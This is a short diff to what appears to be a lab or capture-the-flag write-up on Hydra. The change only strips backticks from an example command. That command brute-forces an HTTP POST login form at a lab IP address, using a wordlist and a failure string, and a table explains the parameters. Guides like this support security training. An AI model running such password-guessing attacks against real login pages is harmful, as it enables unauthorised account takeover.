@@ -59,7 +59,7 @@ sudo hydra <username> <wordlist> 10.48.162.202 http-post-form "<path>:<login_cre
 |`<invalid_response>`|part of the response when the login fails|
 |`-V`|verbose output for every attempt|
 ```Example
-`hydra -l <username> -P <wordlist> 10.48.162.202 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
+hydra -l <username> -P <wordlist> 10.48.162.202 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
 
 - The login page is only `/`, i.e., the main IP address.
